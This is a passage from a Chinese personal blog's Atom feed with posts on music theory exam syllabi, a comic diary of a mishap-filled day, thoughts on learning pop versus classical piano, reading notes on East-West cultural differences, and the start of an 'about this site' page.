高潮</li><li>乐段中的旋律</li><li>课后作业十二</li></ul></li><li>律学常识<ul><li>律学常识</li><li>课后作业十三</li></ul></li><li>单项训练及答题技巧<ul><li>音的高低</li><li>音的长短</li><li>节奏与节拍</li><li>音程</li><li>大小调</li><li>名族调式 中古调式</li><li>旋律调性分析</li><li>和弦</li><li>调关系 转调</li><li>移调 译谱</li></ul></li><li>结语</li></ul><p>可以发现这套课程中，有非常基础的内容，比如音、记谱法，也有流行钢琴中非常重要的和弦、调式、移调等，一开始直接拿到这个目录，也确实有很多名词没有听过，不过没有关系，随着不断的学习，我会逐渐把这个目录中的所有知识搞懂。</p><h1 id="艺考及师范院校乐理的考试大纲"><a href="#艺考及师范院校乐理的考试大纲" class="headerlink" title="艺考及师范院校乐理的考试大纲"></a>艺考及师范院校乐理的考试大纲</h1><p>音乐学院对于乐理的要求是分了等级的，分为A类、B类、C类三类，因为音乐对应不同专业对乐理的要求是不同的。</p><ul><li>A类：指挥系、作曲系</li><li>B类：音乐学系、音乐科技系、音乐教育系</li><li>C类：声乐类、民乐系、管弦系、钢琴系</li></ul><p>可以看出，三类专业从上到下，难度依次递减，把音乐作为兴趣爱好的我们，学习乐器显然在C类，对乐理的要求确实不高。那么这三类具体的内容是什么呢？</p><h2 id="A类"><a href="#A类" class="headerlink" title="A类"></a>A类</h2><ul><li>音、音高与音律以及记谱法只是的理解与掌握</li><li>各种音程与和弦原转位知识的理解、识别与分析，调式中的音程与和弦解决</li><li>各类西洋大小调、民族调式、<strong>中古调式</strong>知识的理解、识别与分析</li><li>节拍与节奏基本概念的理解，各种节拍的识别与音值组合法则的掌握</li><li>各类调式变音以及调的交替与转换手法的理解、识别与分析</li><li>各种移调方法的掌握</li><li>各种常用装饰音、演奏法记号以及音乐术语的熟练掌握</li></ul><h2 id="B类"><a href="#B类" class="headerlink" title="B类"></a>B类</h2><ul><li>音、音高与音律以及记谱法只是的理解与掌握</li><li>各种音程与和弦原转位知识的理解、识别与分析，调式中的音程与和弦解决</li><li>各类西洋大小调、民族调式知识的理解、识别与分析</li><li>节拍与节奏基本概念的理解，各种节拍的识别与音值组合法则的掌握</li><li>各类调式变音以及调的交替与转换手法的理解、识别与分析</li><li>各种移调方法的掌握</li><li>各种常用装饰音、演奏法记号以及音乐术语的熟练掌握</li></ul><p>B类相比A类，大体相同，但<strong>少了A类中的中古调式。</strong></p><p>C类</p><ul><li>音、音高与音律以及记谱法只是的理解与掌握</li><li><strong>各种音程、三和弦以及四种常用七和弦原转位和弦知识的理解、识别与分析</strong></li><li>各类西洋大小调、<strong>民族五声调式以及偏音</strong>知识的理解、识别与分析</li><li>节拍与节奏基本概念的理解，各种常用节拍的识别，单拍子与复拍子音值组合法则的掌握</li><li>各种调与调的关系、简单移调方法的掌握</li><li>各种常用装饰音、演奏法记号以及音乐术语的熟练掌握</li></ul><p>C类相比A类，又少了一大块知识点：<strong>中古调式、各类调式、交替及转调</strong>。</p><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>不知不觉又写了好多，怎么说呢，作为爱好者，我觉得虽然没必要像考试一样去应付做题，但是我们的重点在于理解和应用，用A类的标准来要求自己，相信对自己之后有非常大的帮助。</p>]]></content>
    
    
    <categories>
      
      <category>音乐</category>
      
      <category>乐理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>乐理</tag>
      
      <tag>音乐</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记录悲惨的一天</title>
    <link href="/posts/605fab01.html"/>
    <url>/posts/605fab01.html</url>
    
    <content type="html"><![CDATA[<p>这篇文章本身打算昨天写的，但是昨天真的是点太背了，我怕写日记，写着写着，自己一个月工资的笔记本再给我写炸了，那我人就炸了。</p><h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>我们家冯冯这周末去山西参加大学舍友的婚礼，给新娘当伴娘（哎，小声diss一句，那么圆的腰，这礼服怎么穿得出去哟），顺带回母校看了一下，所以，狗子有了一个愉快的周末，可以随意放肆，想干啥干啥，但是嘞，冯冯周日（也就是昨天）回来，那这马上要下基层了，估计就是最后一面（咋这么凄凉呢）了，不得去接一下我的小仙女嘛？带她出去吃个送行酒？然后吃了这顿，就好好上路：）</p><h1 id="悲惨的经过"><a href="#悲惨的经过" class="headerlink" title="悲惨的经过"></a>悲惨的经过</h1><p>这一天天，怎么个悲惨法呢？且看下文分晓。</p><h2 id="忘记关灯，费的是电，心疼的是钱"><a href="#忘记关灯，费的是电，心疼的是钱" class="headerlink" title="忘记关灯，费的是电，心疼的是钱"></a>忘记关灯，费的是电，心疼的是钱</h2><p>怎么个悲惨法呢，从我家到火车站，差不多要一个小时10分钟左右的路程，本身计划提前一个半小时出发，结果呢，自己懒癌犯了，赖在床上看视频。等到提前一个半小时的点了，望了望窗外飘着的雪花，又看了看自己只穿了裤衩的身子（哎哟，羞羞羞），那咋办麽？提起裤子，抄起棉大衣就往外冲（我没带手表，任何的微信消息都不会提醒了，我将错过很多重要的信息）。没错，我没关灯，哎哟，这晚上回家可心疼死我这只铁公鸡了。嗯，没有忘记给冯冯带LIFAIR的口罩和她的伞，我还是挺暖的，嗯！！！</p><h2 id="打了个高价车"><a href="#打了个高价车" class="headerlink" title="打了个高价车"></a>打了个高价车</h2><p>然后嘞，我忽略了一件非常重要的事情，下雨、下雪天不好打车。神TM，我下楼梯就点开滴滴开始叫车了，等到了小区门口，还没打到车，这我哪忍得了啊？加红包，没错，我给加了10块钱红包，才有司机接我的单。嗯，出租车司机挺实在，空调开的挺暖和，腿上还铺了个毯子，这是年纪轻轻就得老寒腿啦？</p><h2 id="地铁空调不要电吗？热死人啊？"><a href="#地铁空调不要电吗？热死人啊？" class="headerlink" title="地铁空调不要电吗？热死人啊？"></a>地铁空调不要电吗？热死人啊？</h2><p>我穿着我的大棉衣（到膝盖那种），在寒风中贼嘚瑟，看着缩着脖子的小哥哥、小姐姐，乐得不行，你看他们那个亚子，好滑稽哦！！哈哈哈哈哈，好开心哦，嘻嘻还是我睿智，看我穿的多暖和。然而，当我上了地铁，瞬间人傻了，🔥~这暖气，得劲儿啊！这个时候，你看到了一个滑稽的画面：<strong>一个一米八三，一百六十斤的胖子，像个憨批，一只手提着背包，一只手拿着伞，然后抱着他到膝盖长的棉衣，不知所措，地铁摇摇晃晃，我也摇摇晃晃。时不时想掏手机看看女票走哪了，哪还有手空出来能用啊？</strong>那咋办嘛？骂娘有用吗？我真！@#￥%……&amp;*</p><h2 id="一步错，步步错"><a href="#一步错，步步错" class="headerlink" title="一步错，步步错"></a>一步错，步步错</h2><p>我本身计划着，提前到了，给冯冯和她的闺蜜们带几杯奶茶，天怪冷的，到了有杯喝的起码挺暖和吧！就算多喝热水生理上帮助不大，心里也应该暖的吧。你看人家男票，又高，又帅，又有才华，会弹琴，还对人家冯冯体贴，多好哦，羡慕哦。可是呢，打车耽搁了太长时间，我琢磨着买了奶茶怕是接不到人了，所以就提前告诉冯冯我可能会迟。</p><p>没错，等我见到冯冯的时候，她带了一个夏洛克同款英伦小帽子，捧着杯燕麦牛奶就走来了。你们没猜错，冯冯闺蜜的男票送的，给她们姐妹一人一杯，哎，我心里这个不得劲儿。得，体现我温柔、帅气、体贴、有才华、又高、还会弹钢琴的机会么得了。</p><h2 id="注定是个杯具的一天"><a href="#注定是个杯具的一天" class="headerlink" title="注定是个杯具的一天"></a>注定是个杯具的一天</h2><p>你是不是觉得事情到这里就结束了？呵，冷笑一声，还早呢。接到了冯冯，自然要帮冯冯拿行李呀，冯冯就提了一个小袋子，是给伴娘的随手礼，说是一个杯子，也不知道是不是。于是乎，坐上地铁的我，腿上放着冯冯的小袋子，袋子上放着背包，哎呀，重要接着人了，也算是没白跑，嘻嘻。咦？到站啦，好嘞！拿起背包，我起~ <strong>Bia Ji！！！</strong>我人傻了，杯子乖乖的躺在了地上了。“<strong>杯子坏了我要赔吗？</strong>”</p><h2 id="冯冯新买的吸尘器真好玩"><a href="#冯冯新买的吸尘器真好玩" class="headerlink" title="冯冯新买的吸尘器真好玩"></a>冯冯新买的吸尘器真好玩</h2><p>说来也巧，刚看了爱否的吸尘器测评，冯冯就想买个吸尘器，就跟她安利了视频。回到冯冯家，冯冯拉屎去了，看到墙角的吸尘器。哎哟，这现在的吸尘器长的挺别致哈？还是无线的，充了电，推着走行了。来，待本公子来把玩把玩，呼呼呼~，好玩好玩！！！！哎呀，不玩了，咋还给她打扫上了，美得她。放回去！！嗯，我160斤的身躯刚挨上沙发，<strong>Bia Ji！！！</strong>我滴个亲乖乖，我摔坏了什么？怎么有个零件弹出来了？待我定睛一看，哦，吸尘器好着的，墙角的那叫啥？就是地板和墙壁之间，矮矮的那一圈。给摔烂了，咋办？不知所措。“亲爱哒，告诉你个好消息，你看，我把你新买的吸尘器摔了，但是吸尘器是好的，没坏，嘻嘻！！！但是，你看，<strong>墙角那啥坏了。。。我要赔吗？</strong>”</p><h2 id="报应来的太快了"><a href="#报应来的太快了" class="headerlink" title="报应来的太快了"></a>报应来的太快了</h2><p>和冯冯看了会儿电视，就决定出去吃饭啦。我们去吃小郡肝，哎哟，一进门我就想说，这桌子也太矮了吧，给霍比特人用的吧？还是给约德尔人用的，真是。紧接着，也不知道哪里窜出来的服务员，往桌子边缘放了一壶刚烧开的茶水。我就那么帅气的撩了一下自己到膝盖的棉衣，<strong>Bia Ji！！！</strong>哇！！！我人尬住了，TM壶倒了，水洒了我一身。我脑子像华为手机一样9600帧慢动作，放着水壶跌落的全过程，然后脑子里只有一个念头：“<strong>我CAO，这壶该不用我赔吧？</strong>今天貌似要赔好多东西呢？”紧接着，就是老板大声吆喝：“你看这娃，放个水你放桌子边上，真是刚来啥都不会！！没事吧，没烫着吧，快把鞋脱了看看，来来来，纸。”</p><p>没错，吃饭的整个过程中，我依然不是碰了这个盘子，就是动了那个碗，Bia ji Bia ji的，这是咋地了？</p><h2 id="天亮了，我尿床了"><a href="#天亮了，我尿床了" class="headerlink" title="天亮了，我尿床了"></a>天亮了，我尿床了</h2><p>吃了饭，和冯冯出去散了散步，聊了聊有的没的，冯冯说我的手好暖和，我说冯冯的英伦小帽子真可爱。得，时间不早了，送冯冯回家，哎呀，终于到冯冯小区门口了，说句实话，霉运也该没了吧？<strong>Bia Ji？？？</strong>唔啦啦？这脚感，这声响？我怕不是踩着屎了吧？</p><blockquote><p>“冯冯你等等，我看看”</p><p>“别了吧，走啦！！”</p><p>“你别急，我在地上蹭一下，我看看鞋底！！”</p></blockquote><p>我刚弯下腰，一股熟悉的味道扑面而来，没错，就是那个味儿，记忆犹新！！！我踩屎了！！！</p><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>冯冯说，之后见岳父岳母，可不能再像今天这样毛手毛脚了，两个毛手毛脚的仔子，在一起可咋过哦。我心想啊，下次要真见岳父岳母，我就给他安排到海底捞去，我就不信了，还有愣头青服务员这样搞人心态的。不过说起来吧，都是连锁反应，人呀，还是不能懒，你说我早出门个20分钟，从从容容的，也就不会有今天这么一大堆赶不上趟，心不在焉的事了，你说对不？</p>]]></content>
    
    
    <categories>
      
      <category>生活</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>谈谈我对学钢琴的看法</title>
    <link href="/posts/56b04d6f.html"/>
    <url>/posts/56b04d6f.html</url>
    
    <content type="html"><![CDATA[<h1 id="我学习钢琴的那些故事"><a href="#我学习钢琴的那些故事" class="headerlink" title="我学习钢琴的那些故事"></a>我学习钢琴的那些故事</h1><p>刚刚重新温习了一边歪江他们关于<a href="https://www.bilibili.com/video/av53462352">MIDI键盘的视频</a>，忽然想谈谈我对学音乐的看法，我是从什么时候开始学习钢琴的呢？我也记不太清楚了，大概是小学吧，我学琴是因为麻麻从事的音乐行业，家里买了琴，也不知道为什么，就必须弹一个小时钢琴，才能玩一个小时游戏，这也太痛苦了吧。所以当麻麻去进修学习，学到了一些东西，便回来教我。虽然麻麻开玩笑说，其实你弹琴，手上的功夫是有学院派的感觉在里面的（我也搞不清楚，到底是鼓励我坚持乐器这样一件东西还是真的有），但是其实我个人觉得自己会的不多，除了反复枯燥的练习哈农，还有艰难地练习大汤——《现代钢琴教程》，以外没有任何的记忆了。</p><p>我记得小学学了几年钢琴之后，大汤弹了两本，再弹不下去了，可能确实是曲子有一些演奏的难度，麻麻的能力有限。从初中开始，我就放弃钢琴了。那我是什么时候开始重新捡起钢琴的呢？是高中吧，那个时候，看CT英雄联盟的视频，发现他视频的BGM挺好听的，知道了dj okawari这个人，听到了《Flower Dance》和《Luv Letter》两首曲子，觉得太好听了，一定要练会，便重新捡起来了。之后呢，就由着自己的性子，想起来了，练练哈农，巩固自己的基本功。想不起来了，就随便弹弹什么，比如自己现在很喜欢石进，便买了他的谱子，弹他的曲子。比如觉得周杰伦的歌弹出来好好听，便找谱子去弹。但是，始终跳不出一个东西，<strong>我弹任何曲子，都需要需要找钢琴谱，然后照着钢琴谱练习很久，才能弹。并且，练习一首新的曲子需要的周期非常长。</strong></p><p>上大学的时候，我遇到过另外以为自学钢琴的小伙伴，他是学数学的，去北邮继续学习了。他学琴是从大学开始的，纯粹是自己喜欢，不过发现他的水平确实不亚于我这个所谓的童子功。我记得我们有这样一段对话：</p><blockquote><p> 他问：“你们从小学琴的是不是乐感、乐理特别好，照着钢琴谱不用听原曲，照着就能弹？”</p><p>我说：“也不是吧，我也得听原曲，然后谱子只是我会认，知道音在哪儿。”</p><p>他们：“那你看着五线谱，直接能很快的弹出来嘛？就是视奏。”</p><p>我是：“我视奏能力也很弱，不太行的。”</p><p>他说：“我也是，你看，为了练习更快，我把五线谱标记成了简谱，嘻嘻，我就能很快的认谱了。”</p></blockquote><h1 id="学习钢琴还分流派？"><a href="#学习钢琴还分流派？" class="headerlink" title="学习钢琴还分流派？"></a>学习钢琴还分流派？</h1><p>其实学习钢琴还分流派，我也是今年才知道的。今年看到了B站上非常火的4536251以及kyle xian的即兴演奏，乐理、即兴、流行的概念不断的出现在我的视线里。那么学钢琴能分成几个流派呢？我觉得可以简单的分成两个，古典钢琴和流行钢琴。他们的区别在于：</p><ul><li><strong>古典钢琴简单来说，演奏难</strong>。它强调演奏的技巧。比如《匈牙利狂想曲六》里面变态的八度音阶，《钟》里面跨度很大、距离很远、速度很快的音符。这意味着，学习古典钢琴的人，需要相当长的周期，练习各种演奏的技巧以挑战各种高难度的曲目。很难想象，花费一年、两年时间，就为了把一个难度很高的曲目练习好，这是多么艰辛的一种体验。举几个古典钢琴代表性的人物，那就是朗朗、李云迪。古典钢琴需要每天保证练习时长（朗朗当年可是除了吃饭睡觉，都在练琴的）的前提下，长达10年以上学习，所以基本上没有人建议成年人学习古典钢琴。当然，我也认识小伙伴真的将古典钢琴作为自己兴趣的，他自称“重邮李斯特”，但毕竟他这样的人还是少数。你让我听一听古典，我还真不一定欣赏得来，我觉得可能治疗失眠挺好。从职业生涯上来看，古典钢琴通常是希望从事钢琴演奏这个职业，意味着如果不能成为朗朗那样的钢琴家，出路是很少的，也许只能选择去当钢琴老师？对了，没错，所谓的考级，属于古典钢琴的范畴吧，毕竟考级的曲目都是古典的曲目。</li><li><strong>流行钢琴简单来说，音乐的知识体系难</strong>。它强调的是音乐的知识体系（<strong>乐理是重中之重</strong>），音乐的品味，相对弱化演奏技巧。比如我今天听到了曾经喜欢的《青花瓷》，不需要乐谱，听两遍，我就能弹出来。比如年会，领导就喜欢听《月亮代表我的心》，我回想一下旋律，熟悉下和弦，上手就来。我觉得学习流行钢琴是非常快乐的一件事情，因为在学习了一定的方法后，你能够根据自己的心情，“玩”钢琴，而不是枯燥地照着一个一个谱子，反复练习。举两个代表性的人的话，那就是周杰伦、林俊杰、胡海泉。从表演效果来看，古典钢琴弹一个《钟》，别人会说，“哦~厉害，手好快！”，这需要你付出长达十年的练习周期。流行钢琴弹一个周杰伦的串烧，别人会发自内心的觉得音乐带给他快乐，周杰伦还能这样玩？这需要你付出半年系统的学习就行了。我觉得，大部分学习乐器，是希望音乐作为一种兴趣，在自己开心、失落的时候陪伴自己。所以从这个角度来看，我觉得普通人口中说的学钢琴，应该指的是流行钢琴。</li></ul><p>所以，古典钢琴和流行钢琴是有很多不同的，从学习的路径上来说，这两个不同的流派在初期，学习的内容是一样的，比如《哈农》、《车尔尼》、《拜尔》这类对于演奏基本功的练习，说白了，你起码都得“按”得响琴吧！在具备了一定的基础后，古典钢琴将要求学习者练习更多高难度的曲目，强化自己的演奏技巧。流行钢琴则需要学习者学好和弦，活学活用，强化自己的视唱练耳，音乐品味。<strong>我喜欢把学音乐类比成学习语言，古典钢琴更像是练习书法，他需要很长的练习时长和技巧。流行钢琴更像是学习写作，他需要你有一定的语法知识（不能出现病句吧），然后发挥自己的创造力。</strong></p><h1 id="学习钢琴的困难在哪儿？"><a href="#学习钢琴的困难在哪儿？" class="headerlink" title="学习钢琴的困难在哪儿？"></a>学习钢琴的困难在哪儿？</h1><p>工欲善其事，必先利其器。磨刀不误砍柴工，那么问题来了<strong>，学习钢琴的困难在哪儿？</strong>我觉得在两个方面，<strong>学习目标的不明确和学习路径不够体系化。</strong></p><ul><li><strong>学习目标的不明确。</strong>造成学习目标不明确的原因不是说我们学的人，而是整个行业的问题。虽然我的麻麻是从事音乐行业，但是提及我想学流行钢琴的时候，还是一皱眉，没有人教呀！没错，我们在琴行学琴或者在音乐学院找老师学钢琴，都是在教古典钢琴，没有人教流行钢琴。这就意味着，我本身是想学流行钢琴，弹一弹周杰伦，弹一弹献给爱丽丝，但是我不知道什么是流行钢琴，我只知道我要学钢琴，然后老师也没有给我选项，就这样莫名其妙的上了古典钢琴的船。</li><li><strong>学习路径不够体系化。</strong>我看过琴行老师的排课表，基本上也是照着大汤和小汤进行的，每堂课的内容就是一首曲子。这样就出现了一个很严重的问题，<strong>乐理</strong>。把学音乐类比到学语言，学英语我们确实要诵读英文文章，一开始照着文章读，读到一定程度不需要照着读了，就会背了。弹曲子也一样，一开始照着谱子弹，弹到一定程度，不需要照着弹了，就不需要谱子了。相信这时候你也发现问题了，我们学英语，学习语法是贯穿整个学习过程的，不学语法，上来直接读英文文章，肯定读不明白。学会了语法，我们就知道写文章，怎么样不会出语病。说英文，怎么样和别人沟通别人能听懂。<strong>我学习音乐怎么没有学语法？没错，与语言语法对应的就是音乐的乐理。</strong>大部分学习钢琴的人，注意力放在了学习新曲子上，忽略了的学习乐理，当然，很大一部分责任在于老师和家长。学曲子，我们能看到实打实的“进步”，我们能看到过了几级。但是学习乐理，我们能看到什么？确实很难有能看到实质性的收获，<strong>但是，我认为就跟我们学习语言一样，不能说学习语法看不到实质性的收获就不学，他对于我们构建整个知识体系太重要了。</strong></li></ul><p>问题来了，学习目标的不明确和学习路径的不体系化这两个问题是学习钢琴的困难，那么这个困难源自哪里？没错，源自整个行业，学生和老师都有责任。我们去学习乐器，不会说：“老师，你先给我把音乐的知识体系讲明白了，学钢琴能分成什么流派，我做个选择，我们再开始学习怎么弹钢琴吧。”大部分人，还是会跟着老师的授课节奏走，老师为了讨喜学员，自然教曲子，弱化乐理，毕竟，学生都喜欢弹曲子。弹会了几首曲子，过了几级，可能给学生带来的成就感更高。</p><p>那么这么看就很有意思了，流行钢琴强调音乐的体系，我压根都不怎么懂乐理，老师只教我怎么发力、手型怎么样，指法怎么样，从来没系统的教过乐理啊？乐理？我除了会认五线谱，什么都不知道啊！<strong>没有明确目标的人，跟着老师学，学不下去就放弃了，古典真的太难了。有明确目标，像我这样的人，发现没有专门教乐理的老师啊？这是我目前的困境，我练了十几年琴，除了手型、高抬指，什么都不记得。我想学习乐理，但是网上零散的视频，都不能帮助我很好的构建音乐体系。这意味着我很难像“大神”那样，听到曲子，分析出和弦就能弹，但是这才是音乐真正能带给我快乐的地方。</strong></p><p>所以，我觉得，要想学习好钢琴，需要先明白自己想学习什么流派的，想学习古典钢琴，年龄大基本就不太能考虑了。学习流行，就需要在练习演奏基本功的同时，逼着自己去学习乐理。</p><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>说起来也是阴差阳错，博客的更新计划里没有这篇文章，但是真的很想记录一下自己此刻的想法。从工作开始到现在，尤其今年，希望学习流行钢琴，学习即兴演奏、即兴伴奏的欲望非常强烈，2000多买了姜创钢琴的书，不能说没帮助，帮助太少了。我希望自己能获得明白，至少知道我做一件事是为了什么去做，即使最后没有做成功，我也是明明白白失败的。</p><p>今天是因为读书，看到了一篇关于中外文化差异的文章——<a href="https://www.gaficat.com/posts/359102a1.html">《飞升与落地》</a>，联想到之前看过的视频，有提到中外音乐的差异，重温了一边视频，再次勾起了我学习流行钢琴的欲望。我刚在网易云课堂花了三百买了一个给艺考生将语法的课，打算专门开一个分类，把自己学习乐理的整个过程记录下来，希望之后某天再回头看，发现自己几年的这个决定还行。也希望自己有朝一日，也能听一首曲子，就能潇洒的弹出来，有什么活动，抱一个键盘上去，一个人就是一支乐队。希望自己的300块没白花，哎，工作了以后真的对自己财迷，天天白水煮面吃得快吐了（谁让自己体检出了问题，要让自己注意:(，不开心），顶不住顶不住~</p>]]></content>
    
    
    <categories>
      
      <category>音乐</category>
      
      <category>乐理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>乐理</tag>
      
      <tag>音乐</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《飞升与落地》读书笔记</title>
    <link href="/posts/359102a1.html"/>
    <url>/posts/359102a1.html</url>
    
    <content type="html"><![CDATA[<p>这篇文章来自《读者半月刊2018年冬季卷合订本》，位置<code># 3352</code>，通过芭蕾和建筑两个例子，讲解了中西方文明的差异，感觉作者写的确实挺好的，轮不上我插嘴啊，直接摘抄很多东西吧，当作是一种涨知识。</p><h1 id="芭蕾的由来"><a href="#芭蕾的由来" class="headerlink" title="芭蕾的由来"></a>芭蕾的由来</h1><blockquote><p>芭蕾大概是17世纪从法国的宫廷传出来的，为了表现宫廷的优雅利益，他们徐联储一种踮起脚尖走路的碎步，后来就慢慢发展出芭蕾这样的艺术形式。我们会发现，芭蕾对身体的要求最重要的一部分是在脚，特别是爱足踝。</p></blockquote><blockquote><p>人的小腿与脚掌是一个垂直的关系，可是芭蕾的开发经验是违反人体自然状态的，它要求整只脚立起来，做这个动作非常难。尤其是西方芭蕾舞里面的女舞者，穿起舞鞋直立以后，整个人几乎就是一条直线，脚掌与地面几乎完全垂直，她跟地板的接触点只有脚尖。</p></blockquote><h1 id="芭蕾美在哪里"><a href="#芭蕾美在哪里" class="headerlink" title="芭蕾美在哪里"></a>芭蕾美在哪里</h1><blockquote><p>我们知道，脚掌踏在大地上，我们叫踏实；可是如果把脚尖踮起来，意思就是说，我希望追求一个往上飞扬的东西。</p></blockquote><blockquote><p>学芭蕾的女孩走路都是八字脚，他们的身体很瘦，脊椎基本上是往上提的，这是每天进行基本功训练的结果。不同文化发展处不同的身体美学。</p></blockquote><blockquote><p>我们欣赏芭蕾的时候，觉得舞者身体最美的是往上飞起来的力量。往上飞的时候，舞者的足踝非常美，姿态有点像鸟的飞翔，所以芭蕾舞剧《天鹅湖》很有名，里面的动作基本是在模仿鸟的飞翔。</p></blockquote><h1 id="中西方舞蹈的区别"><a href="#中西方舞蹈的区别" class="headerlink" title="中西方舞蹈的区别"></a>中西方舞蹈的区别</h1><blockquote><p>在那些有名的芭蕾舞剧里，常常有一个动作——扮演王子的男舞者把扮演公主的女舞者托举起来，两个人的身体变成一条往上的弧线，是一种升起来的感觉。</p></blockquote><blockquote><p>而在中国的舞台上，你很少看到一个男舞者把女舞者举起来。我不能想象《白蛇传》里的许仙把白娘子举到天上去，因为我们的文化中没有这部分。在东方的文化里，我们不太追求身体的垂直线，而是追求身体移动的美。比如中国传统剧场里的“跑圆场”。这种移动的形式跟西方往上飞翔的美形成了两种非常不同的感动力量。</p></blockquote><p>我对舞蹈没有什么研究，但是中西方文化的差异体现在舞蹈上，这里讲的是舞蹈<strong>表现形式的差异</strong>，确实挺有意思，第一次读到。</p><blockquote><p>芭蕾的基本功，常常在做提气，让气息往上升，然后将整个身体往上拉。</p></blockquote><blockquote><p>可是在传统的中国剧场，演员练功的时候常常是扎马步，往下沉，沉住气。</p></blockquote><p>这里将的是<strong>练习方式的差异</strong>，我觉得这里可以加一个例子，就是太极拳，虽然现在太极拳争议挺大的，比如雷雷被徐晓东KO，但是这种源自中国的健身运动，也是讲究重心向下沉的。</p><h1 id="中西方建筑的差异"><a href="#中西方建筑的差异" class="headerlink" title="中西方建筑的差异"></a>中西方建筑的差异</h1><blockquote><p>西方代表性建筑——大教堂，都强调垂直线，是往上飞起来的。</p></blockquote><blockquote><p>北京的紫禁城，最美的线条基本上是水平线，比如屋顶的水平线。</p></blockquote><p>这里也算是长知识了，西方建筑强调垂直线，中式建筑强调水平线。东方人的身体也讲究稳稳地踏在地平线上，讲究稳重、稳定。</p><h1 id="中西方音乐的差异"><a href="#中西方音乐的差异" class="headerlink" title="中西方音乐的差异"></a>中西方音乐的差异</h1><blockquote><p>中国的音乐更加讲究旋律的变化，而西方更加讲究节奏的律动。</p></blockquote><p>我不太记得是在哪里看过的视频了，好像是game攻壳边一鸣他们讲一些音乐相关的东西提到的，确实，我们听中国的音乐或者现代中国风的音乐，像梁祝、菊花台之类的，旋律是相当优美的。而从西方过来的，像funk很有律动，想rap相当的有节奏，都是有代表性的东西。</p><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>中西方文化的差异体现在很多地方，我记得自己最早关注中西方文化差异，是看曾仕强教授讲《易经》，大概是初中？还是高中？那个时候一开始以为《易经》就是算命的江湖骗子惯用的手法，我那个时候是相当崇洋媚外的，觉得国外的月亮哪哪都圆，后来听了曾仕强教授的讲解，才对《易经》、中国古人的智慧、中国文化的精妙有了一定的认识，才开始关注文化的差异，要对自己的文化有自信。</p><p>其实文化没有优劣，我们一直讲的文化自信我觉得便是如此。那些蕴含在卦象中的宇宙规律，需要有博学的人给你指点和讲解才能够明白，明白了这些，才懂得前人的智慧是多么的巧妙。一方水土养一方人，我觉得文化的差异，究其根本，是与其生活的环境密不可分的。</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>读书笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于本站</title>
    <link href="/posts/62a44034.html"/>
    <url>/posts/62a44034.html</url>
    
    <content type="html"><![CDATA[<h1 id="本站分享的内容"><a href="#本站分享的内容" class="headerlink" title="本站分享的内容"></a>本站分享的内容</h1><p>本站将分享各种<strong>电子设计DIY、物联网DIY、读书笔记、生活想法、流行钢琴、工作中遇到的问题（docker使用技巧、网络安全、python、网络协议）、建站技巧等等</strong>内容。刚刚开始维护，很多内容还没有来得及更新，其实从本站的名字——<strong>加菲猫的创客工坊</strong>，就可以看出，初期一定是想分享一些DIY、创客相关内容的。但是发现，电子设计需要大量的时间去折腾，我本人也比较懒，很难维持一个稳定的更新频率，所以索性将自己生活、工作中所有希望分享到内容都写到本站里面，毕竟两天一篇读书笔记的更新频率还是能维持的，我希望我的读书笔记，能成为茶余饭后的一种坛子。大家的时间都非常宝贵，所以我把这篇文章置顶，希望能让正在看本站的你，在不到一分钟的时间里面了解本站的内容，喜欢的呢，<strong>欢迎<a href="https://www.gaficat.com/atom.xml">RSS</a>订阅或者时不时的来踩一下</strong>，不喜欢的呢，就可以关闭这个网页了。现在很多东西都讲求流量，所以很多人都转战公众号之类的平台，但我本人有些反感公众号这种形式，它推送一堆乱七八糟的文章，我还是希望有一个本站这样的地方，可以自己排版，让你的页面清清爽爽，没有任何广告，静下心，沉淀一些内容出来。对于浏览本篇文章的你而言，需要的时候可以来逛逛，忙碌的时候，我就一直安安静静地在这里，不打扰你的生活，就酱。</p><h1 id="关于本站的故事"><a href="#关于本站的故事" class="headerlink" title="关于本站的故事"></a>关于本站的故事</h1><p>其实说到写博客，最早的印象，应该是小学的同学录，那个时候小朋友们在文具店，从花花绿绿的同学录中挑一本自己喜欢的，然后把同学录一页一页发给自己希望继续交往的小伙伴们。同学录中需要填写的内容很多，有你最喜欢的人是谁？你的口头禅是什么？你未来最想从事的职业是什么？你希望对我说什么？当然啦，其中我觉得最不知道怎么填写的，就是——<strong>你的个人网站是什么？</strong></p><p>那么说起个人网站，就不得不提电脑了，毕竟那个时候智能手机不发达，写本站的前提，就是你要会用电脑。我对于电脑最早的印象应该是舅舅的笔记本电脑，我还依稀记得开机时windows98的画面，觉得这个洋玩意儿好神奇，也真的好贵。后来关于电脑的启蒙，应该是麻麻去参加一个考试，需要用到电脑，所以在学电脑的时候带上我，最吸引我的，当然还是玩游戏啦（这里其实挺内疚的，当时太喜欢玩游戏了，每次麻麻培训我都要粘着去，当然，我需要占用麻麻课时）。之后，小学开了信息技术（电脑）课，我不太记得清楚当时教的内容了，印象里也只有老师说，用百度搜索你想找的东西，需要想出关键词，然后用空格隔开。还记得有作业要用dreamware还是什么来着，做过一个网页，然后去找各种特效，那种鼠标放进去花花绿绿各种动画的，觉得好炫酷。当然了，大家最开心的环节，就是上课的时候，偷偷玩4399或者泡泡堂。虽然接触电脑还挺早的，但是小孩子嘛，兴趣点都在玩游戏上。喔，想到一个插曲，小时候爸爸为了防止我偷偷玩游戏，给家里的电脑设了密码，我还搜到了破解windows开机密码的程序，从此，爸爸知道我能破解开机密码，也就拿我没办法了。不知道这个事件是不是冥冥之中，暗示了我未来会进入网络安全行业。</p><p>后来，上初中以后，我有了自己的第一个QQ号，<strong>2009年12月19日</strong>，我开通了QQ空间。<strong>2010年8月27日</strong>，我在空间中转载了一个视频，那是我第一篇在互联网中的文章，是当时大火的DNF，一个搞笑视频。<strong>2